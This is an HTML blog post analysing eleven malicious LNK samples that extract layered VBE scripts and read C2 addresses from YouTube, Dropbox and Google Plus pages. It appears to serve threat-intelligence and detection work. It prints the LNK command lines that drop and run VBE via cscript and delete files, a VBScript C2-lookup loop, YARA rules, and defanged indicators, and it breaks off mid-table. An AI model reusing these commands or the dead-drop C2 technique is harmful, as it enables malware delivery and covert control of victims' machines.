@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        YouTube is my C2 - bit_of_hex
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="A couple of days back I tweeted about some interesting LNK file samples I had found on Virus Total. They were interesting due to their endless Russian Doll-esque style of behaviour which involed extracting VBE script upon VBE script, patching headers and reversing bytes.
+As of 31 May 2020, I&amp;rsquo;ve identified eleven samples dating between 2020-03-02 to 2020-05-29 as uploaded to Virus Total. They are all consistently created from the same VMWare host using the same account, and the same base LNK template as seen by the output of LECMD:" />
+  <meta name="generator" content="Hugo 0.68.3 with theme pure" />
+  <title>YouTube is my C2 - bit_of_hex</title>
+  
+  
+  <link rel="stylesheet" href="https://bitofhex.com/css/style.min.c4bc7071f132c964c2116bca53b392933f377e5ca7b7051ed245187c621a2d3e.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="YouTube is my C2" />
+<meta property="og:description" content="A couple of days back I tweeted about some interesting LNK file samples I had found on Virus Total. They were interesting due to their endless Russian Doll-esque style of behaviour which involed extracting VBE script upon VBE script, patching headers and reversing bytes.
+As of 31 May 2020, I&rsquo;ve identified eleven samples dating between 2020-03-02 to 2020-05-29 as uploaded to Virus Total. They are all consistently created from the same VMWare host using the same account, and the same base LNK template as seen by the output of LECMD:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bitofhex.com/2020/05/31/youtube-is-my-c2/" />
+<meta property="article:published_time" content="2020-05-31T10:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-31T10:00:00+00:00" />
+<meta itemprop="name" content="YouTube is my C2">
+<meta itemprop="description" content="A couple of days back I tweeted about some interesting LNK file samples I had found on Virus Total. They were interesting due to their endless Russian Doll-esque style of behaviour which involed extracting VBE script upon VBE script, patching headers and reversing bytes.
+As of 31 May 2020, I&rsquo;ve identified eleven samples dating between 2020-03-02 to 2020-05-29 as uploaded to Virus Total. They are all consistently created from the same VMWare host using the same account, and the same base LNK template as seen by the output of LECMD:">
+<meta itemprop="datePublished" content="2020-05-31T10:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-05-31T10:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1147">
+
+
+
+<meta itemprop="keywords" content="malware,lnk,threat intelligence," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="YouTube is my C2"/>
+<meta name="twitter:description" content="A couple of days back I tweeted about some interesting LNK file samples I had found on Virus Total. They were interesting due to their endless Russian Doll-esque style of behaviour which involed extracting VBE script upon VBE script, patching headers and reversing bytes.
+As of 31 May 2020, I&rsquo;ve identified eleven samples dating between 2020-03-02 to 2020-05-29 as uploaded to Virus Total. They are all consistently created from the same VMWare host using the same account, and the same base LNK template as seen by the output of LECMD:"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://twitter.com/mattnotmax" target="_blank">
+            <img class="img-circle img-rotate" src="https://bitofhex.com/logo.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">bit_of_hex</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">digital forensics | incident response</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Melbourne, Australia</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-resources">
+                <a href="/resources/">
+                    <i class="icon icon-project"></i>
+                  <span class="menu-title">Resources</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://bitofhex.com/2020/05/31/youtube-is-my-c2/" class="title">YouTube is my C2</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-31 10:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-31</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://bitofhex.com/2020/04/18/forensic-freebie/" class="title">Forensic Freebie with digitalforensics.io</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-04-18 10:53:26 &#43;0000 UTC" itemprop="datePublished">2020-04-18</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://bitofhex.com/2020/02/10/sapphire-mushroom-lnk-files/" class="title">Suspected Sapphire Mushroom (APT-C-12) malicious LNK files</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-02-10 23:54:19 &#43;0000 UTC" itemprop="datePublished">2020-02-10</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://bitofhex.com/2019/11/17/say-cheese-an-analysis-of-foto-lnk/" class="title">&#34;Say Cheese!&#34; An analysis of foto.lnk</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-11-17 16:46:26 &#43;0000 UTC" itemprop="datePublished">2019-11-17</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://bitofhex.com/2019/07/15/deriving-intelligence-from-lnk-files/" class="title">Deriving intelligence from LNK files</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-07-15 02:14:48 &#43;0000 UTC" itemprop="datePublished">2019-07-15</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-youtube-is-my-c2" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2020/05/31/youtube-is-my-c2/"
+    >YouTube is my C2</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://bitofhex.com/2020/05/31/youtube-is-my-c2/" class="article-date">
+  <time datetime="2020-05-31 10:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-31</time>
+</a>
+</span>
+  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/malware/"> malware </a>
+    <a class="article-tag-link" href="/tags/lnk/"> lnk </a>
+    <a class="article-tag-link" href="/tags/threat-intelligence/"> threat intelligence </a>
+  </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2020/05/31/youtube-is-my-c2/#comments"
+            class="article-comment-link">Comments</a></span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p>A couple of days back I <a href="https://twitter.com/mattnotmax/status/1265972115011801088">tweeted</a> about some interesting LNK file samples I had found on Virus Total. They were interesting due to their endless Russian Doll-esque style of behaviour which involed extracting VBE script upon VBE script, patching headers and reversing bytes.</p>
+<p>As of 31 May 2020, I&rsquo;ve identified eleven samples dating between 2020-03-02 to 2020-05-29 as uploaded to Virus Total. They are all consistently created from the same VMWare host using the same account, and the same base LNK template as seen by the output of LECMD:</p>
+<h2 id="the-lnk-files">The LNK Files</h2>
+<table>
+<thead>
+<tr>
+<th>SHA256 Hash</th>
+<th>TargetCreated</th>
+<th>TargetModified</th>
+<th>TargetAccessed</th>
+<th>SID</th>
+<th>MachineMACAddress</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1be621c3cd6f26f3ccce00ec492b92bc7197537d7be34ddda06a1ebb15136184</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>20026af8c1bd95d4a39c2d1d1c2909ed133a5d2efac2d6c6b87cbc4d2782fef0</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>26fd8d1abe275f611779951c1687c3e04091dba12147500409e2db59b7bf6de1</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>2f92936228e4e83ddcb040267bac970908c4d3ed41bc636f808feb7a2eb60044</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>48de3d2ba47f482e912792ef677fec95557da5d14eb65321ff8290e59531076a</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>62901e68c0c990a7ee69a2954f931dc643be430a8d09f316974d88a0ed97a268</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>65469ae4cb1f05ea1b7a174cbdfbb63021cc2971693a29e226dc510dec20dc3e</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>7eb4ea6277bd62653cc474cf1125165c9bdc43858811c0d88be25e2ec34bc14d</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>83d6a78e4e03fdf0447502626df4931099b57fc557ef0fe22032e34733d494e1</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>bbd2a1f2cb9b929e4ca09310caeb43c7257ebdd7c3872b8f62645eb659c4c89d</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+<tr>
+<td>d7d74fafc0c4a65e080c04479a0f1fd1da8cd34aee59e88ac49de3f844362416</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>2010-11-21 03:24:03</td>
+<td>S-1-5-21-2529457200-49751210-1696528657-1000</td>
+<td>00:50:56:c0:00:08</td>
+</tr>
+</tbody>
+</table>
+<p>Further the initial command the LNK file uses is the same pattern similar to either <code>/c copy Ack*ume %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   *&amp;for /f &quot;delims=&quot; %a in ('dir /s /b *') do type   &quot;%~fa&quot; \| find &quot;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &quot;%~fa&quot; </code><br>
+or<br>
+<code>/c copy *.doc %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;dir /b /s   *.doc&gt;o&amp;echo set /p f=^&lt;o&gt;.bat&amp;echo type   &quot;%f%&quot;^&gt;z9&gt;&gt;.bat&amp;echo findstr /R /C:&quot;#@~&quot;   z9^&gt;1.vbe^&amp;cscript 1.vbe^&amp;del * /S /Q /Y&gt;&gt;.bat&amp;.bat</code>:</p>
+<table>
+<thead>
+<tr>
+<th>SourceFile</th>
+<th>Arguments</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1be621c3cd6f26f3ccce00ec492b92bc7197537d7be34ddda06a1ebb15136184</td>
+<td>/c copy Ack*ume %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   *&amp;for /f &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type   &ldquo;%~fa&rdquo; | find &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>20026af8c1bd95d4a39c2d1d1c2909ed133a5d2efac2d6c6b87cbc4d2782fef0</td>
+<td>/c copy SMP*.txt %tmp%&amp;cd %tmp%&amp;attrib +r *&amp;for /f   &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type &ldquo;%~fa&rdquo; | find   &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>26fd8d1abe275f611779951c1687c3e04091dba12147500409e2db59b7bf6de1</td>
+<td>/c copy *.doc %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;dir /b /s   *.doc&gt;o&amp;echo set /p f=^<o>.bat&amp;echo type   &ldquo;%f%&ldquo;^&gt;z9&raquo;.bat&amp;echo findstr /R /C:&quot;#@~&rdquo;   z9^&gt;1.vbe^&amp;cscript 1.vbe^&amp;del * /S /Q /Y&raquo;.bat&amp;.bat</td>
+</tr>
+<tr>
+<td>2f92936228e4e83ddcb040267bac970908c4d3ed41bc636f808feb7a2eb60044</td>
+<td>/c copy *.doc %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;dir /b /s   *.doc&gt;o&amp;echo set /p f=^<o>.bat&amp;echo type   &ldquo;%f%&ldquo;^&gt;z9&raquo;.bat&amp;echo findstr /R /C:&quot;#@~&rdquo;   z9^&gt;1.vbe^&amp;cscript 1.vbe^&amp;del * /S /Q /Y&raquo;.bat&amp;.bat</td>
+</tr>
+<tr>
+<td>48de3d2ba47f482e912792ef677fec95557da5d14eb65321ff8290e59531076a</td>
+<td>/c copy Ori*.txt %tmp%&amp;cd %tmp%&amp;attrib +r *&amp;for /f   &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type &ldquo;%~fa&rdquo; | find   &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>62901e68c0c990a7ee69a2954f931dc643be430a8d09f316974d88a0ed97a268</td>
+<td>/c copy *.pdf %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;dir /b /s   *.pdf&gt;o&amp;echo set /p f=^<o>.bat&amp;echo type   &ldquo;%f%&ldquo;^&gt;z9&raquo;.bat&amp;echo findstr /R /C:&quot;#@~&rdquo;   z9^&gt;1.vbe^&amp;cscript 1.vbe^&amp;del * /S /Q /Y&raquo;.bat&amp;.bat</td>
+</tr>
+<tr>
+<td>65469ae4cb1f05ea1b7a174cbdfbb63021cc2971693a29e226dc510dec20dc3e</td>
+<td>/c copy Pro*.jpg %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   *&amp;for /f &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type   &ldquo;%~fa&rdquo; | find &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>7eb4ea6277bd62653cc474cf1125165c9bdc43858811c0d88be25e2ec34bc14d</td>
+<td>/c copy Law*ves %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   <em>&amp;for /f &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b Law</em>ves&rsquo;) do type   &ldquo;%~fa&rdquo; | find &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>83d6a78e4e03fdf0447502626df4931099b57fc557ef0fe22032e34733d494e1</td>
+<td>/c copy Ack*ver %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   *&amp;for /f &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type   &ldquo;%~fa&rdquo; | find &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &ldquo;%~fa&rdquo;</td>
+</tr>
+<tr>
+<td>bbd2a1f2cb9b929e4ca09310caeb43c7257ebdd7c3872b8f62645eb659c4c89d</td>
+<td>/c copy *.doc %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;dir /b /s   *.doc&gt;o&amp;echo set /p f=^<o>.bat&amp;echo type   &ldquo;%f%&ldquo;^&gt;z9&raquo;.bat&amp;echo findstr /R /C:&quot;#@~&rdquo;   z9^&gt;1.vbe^&amp;cscript 1.vbe^&amp;del * /S /Q /Y&raquo;.bat&amp;.bat</td>
+</tr>
+<tr>
+<td>d7d74fafc0c4a65e080c04479a0f1fd1da8cd34aee59e88ac49de3f844362416</td>
+<td>/c copy cov*.jpg %tmp%&amp;%systemdrive%&amp;cd %tmp%&amp;attrib +r   *&amp;for /f &ldquo;delims=&rdquo; %a in (&lsquo;dir /s /b *') do type   &ldquo;%~fa&rdquo; | find &ldquo;#@~^&quot;&gt;.vbe&amp;CsCRipt .vbe   &ldquo;%~fa&rdquo;</td>
+</tr>
+</tbody>
+</table>
+<p>All of these were identified using the two yara rules. The initial rule looks for LNK files with a VBE encoded script:</p>
+<pre><code class="xml">rule LNK_with_VBE { 
+ meta: 
+  description = "Detects LNK file with embedded VBE script" 
+  author = "@mattnotmax" 
+  date = "2019-11-16" 
+  hash1 = "D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3"
+  strings: 
+  $a1 = "#@~^" ascii 
+  $a2 = "^#~@" ascii   
+condition: uint16(0) == 0x4c and ($a1 and $a2)
+}
+</code></pre>
+<p>The second was based off the initial hit which was solely looking for this campaign and and focused on the SID:</p>
+<pre><code class="xml">rule weird_LNK
+{
+	meta:
+    
+		author = "@mattnotmax"
+        comment = "This is SID from the inital LNK"
+		date = "2020-05-22"
+		
+	strings:
+		$SID = "S-1-5-21-2529457200-49751210-1696528657" wide
+		
+	condition:
+		uint16(0) == 0x00004c and $SID
+}
+</code></pre>
+<h2 id="down-the-rabbit-hole">Down the rabbit hole&hellip;</h2>
+<p>Some of the LNK files have more elaborate layers of data encoding and/or obfuscation, but what makes these interesting is that they use YouTube and/or other domains as a engine to get or update a c2 IP address.</p>
+<table>
+<thead>
+<tr>
+<th>SourceFile</th>
+<th>Domain 1</th>
+<th>Domain 2</th>
+<th>Domain 3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1be621c3cd6f26f3ccce00ec492b92bc7197537d7be34ddda06a1ebb15136184</td>
+<td>hxxps://youtu[.]be/AApRxqOjLs4</td>
+<td>hxxps://plus[.]google[.]com/109526023785415750407/posts/1ecFp1jLnX1</td>
+<td>hxxps://plus[.]google[.]com/105611301541879878976/posts/fCo9jvzZKNT</td>
+</tr>
+<tr>
+<td>20026af8c1bd95d4a39c2d1d1c2909ed133a5d2efac2d6c6b87cbc4d2782fef0</td>
+<td>hxxps://youtu[.]be/aZRJQdwN4-g</td>
+<td>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</td>
+<td></td>
+</tr>
+<tr>
+<td>26fd8d1abe275f611779951c1687c3e04091dba12147500409e2db59b7bf6de1</td>
+<td>hxxps://dl[.]dropboxusercontent[.]com/s/vz5unuqw4n1smun/index[.]html</td>
+<td>hxxp://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</td>
+<td>hxxps://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</td>
+</tr>
+<tr>
+<td>2f92936228e4e83ddcb040267bac970908c4d3ed41bc636f808feb7a2eb60044</td>
+<td>hxxps://dl[.]dropboxusercontent[.]com/s/7ttsyz4ypnco0sd/file[.]html</td>
+<td>hxxps://copy[.]com/hSn32C8TeJKq/file[.]html</td>
+<td>hxxp://www[.]youtube[.]com/watch?v=8Sxcin85wxQ</td>
+</tr>
+<tr>
+<td>48de3d2ba47f482e912792ef677fec95557da5d14eb65321ff8290e59531076a</td>
+<td>hxxps://youtu[.]be/aZRJQdwN4-g</td>
+<td>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</td>
+<td></td>
+</tr>
+<tr>
+<td>62901e68c0c990a7ee69a2954f931dc643be430a8d09f316974d88a0ed97a268</td>
+<td>hxxps://dl[.]dropboxusercontent[.]com/s/vz5unuqw4n1smun/index[.]html</td>
+<td>hxxp://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</td>
+<td>hxxps://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</td>
+</tr>
+<tr>
+<td>65469ae4cb1f05ea1b7a174cbdfbb63021cc2971693a29e226dc510dec20dc3e</td>
+<td>hxxps://youtu[.]be/aZRJQdwN4-g</td>
+<td>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</td>
+<td></td>
+</tr>
+<tr>
+<td>7eb4ea6277bd62653cc474cf1125165c9bdc43858811c0d88be25e2ec34bc14d</td>
+<td>hxxps://youtu[.]be/AApRxqOjLs4</td>
+<td>hxxps://plus[.]google[.]com/109526023785415750407/posts/1ecFp1jLnX1</td>
+<td>hxxps://plus[.]google[.]com/105611301541879878976/posts/fCo9jvzZKNT</td>
+</tr>
+<tr>
+<td>83d6a78e4e03fdf0447502626df4931099b57fc557ef0fe22032e34733d494e1</td>
+<td>hxxps://youtu[.]be/AApRxqOjLs4</td>
+<td>hxxps://plus[.]google[.]com/109526023785415750407/posts/1ecFp1jLnX1</td>
+<td>hxxps://plus[.]google[.]com/105611301541879878976/posts/fCo9jvzZKNT</td>
+</tr>
+<tr>
+<td>bbd2a1f2cb9b929e4ca09310caeb43c7257ebdd7c3872b8f62645eb659c4c89d</td>
+<td>hxxps://dl[.]dropboxusercontent[.]com/s/7ttsyz4ypnco0sd/file[.]html</td>
+<td>hxxps://copy[.]com/hSn32C8TeJKq/file[.]html</td>
+<td>hxxp://www[.]youtube[.]com/watch?v=8Sxcin85wxQ</td>
+</tr>
+<tr>
+<td>d7d74fafc0c4a65e080c04479a0f1fd1da8cd34aee59e88ac49de3f844362416</td>
+<td>hxxps://youtu[.]be/aZRJQdwN4-g</td>
+<td>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>An example of the YouTube video is as follows:</p>
+<div style="text-align:center"><img src="/2020/05/youtube.jpg" alt="youtube" style="border: #000000 1px outset"></div>  
+<p>All in all 11 different URLs have been identified to date:</p>
+<ul>
+<li>hxxps://youtu[.]be/AApRxqOjLs4</li>
+<li>hxxps://youtu[.]be/aZRJQdwN4-g</li>
+<li>hxxps://dl[.]dropboxusercontent[.]com/s/vz5unuqw4n1smun/index[.]html</li>
+<li>hxxps://dl[.]dropboxusercontent[.]com/s/7ttsyz4ypnco0sd/file[.]html</li>
+<li>hxxps://plus[.]google[.]com/109526023785415750407/posts/1ecFp1jLnX1</li>
+<li>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</li>
+<li>hxxp://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</li>
+<li>hxxps://copy[.]com/hSn32C8TeJKq/file[.]html</li>
+<li>hxxps://plus[.]google[.]com/105611301541879878976/posts/fCo9jvzZKNT</li>
+<li>hxxps://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</li>
+<li>hxxp://www[.]youtube[.]com/watch?v=8Sxcin85wxQ</li>
+</ul>
+<p>The website copy[.]com was discontinued in 2016, and some of the YouTube videos were uploaded between 2013 - 2015. In essence the key (and only) text in the links is then fed into the VB script and divided by <code>1337</code> to obtain a decimal IP address. For example:</p>
+<pre><code class="xml">WHILE serverExists = 0
+		Dim min, max
+		min = 0
+		max = 1
+		Randomize
+		
+		randLink = YouTubeLinks(Int((max-min+1)*Rnd+min))
+		'msgbox(randLink)
+		outputHTML = getPage(randLink, 60, "get")
+		'msgbox(outputHTML)
+		Set objRE = New RegExp
+		With objRE
+			.Pattern = "we need (.*) views"
+			.IgnoreCase = True
+		End With
+		
+		Set objMatch = objRE.Execute( outputHTML )
+
+		
+		IF objMatch.Count = 1 THEN
+			server = ""
+			server = objMatch.Item(0).Submatches(0)
+			server = server / 1337
+			'msgbox(server)
+			server = IPConvert(server)
+			server = "http://" & server & "/B2mV-VzVc-81Az-135J"
+		END IF
+		'msgbox(server)
+		
+		IF Len(server) > 1 THEN
+			status = getPage(server & "/Status2.php", 30, "get")
+			inOK = inStr(status, "OKOKOK")
+			IF NOT inOK = 0 THEN
+				serverExists = 1
+			END IF
+		END IF
+	WEND
+</code></pre>
+<h2 id="yoo-hoo-whats-the-c2">Yoo Hoo, What&rsquo;s the C2?</h2>
+<p>So from the links still available (I didn&rsquo;t have a throwaway Gmail on hand to access the Google Plus links) the obtained C2 addresses are:</p>
+<table>
+<thead>
+<tr>
+<th>URLs</th>
+<th>Integar</th>
+<th>Decimal IP</th>
+<th>Resolved IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>hxxps://youtu[.]be/AApRxqOjLs4</td>
+<td>1962110654532</td>
+<td>1467547236</td>
+<td>87[.]120[.]254[.]100</td>
+</tr>
+<tr>
+<td>hxxps://youtu[.]be/aZRJQdwN4-g</td>
+<td>1962036338724</td>
+<td>1467491652</td>
+<td>87[.]120[.]37[.]68</td>
+</tr>
+<tr>
+<td>hxxps://dl[.]dropboxusercontent[.]com/s/vz5unuqw4n1smun/index[.]html</td>
+<td>49741276945318</td>
+<td>37203647678</td>
+<td>169[.]130[.]156[.]190</td>
+</tr>
+<tr>
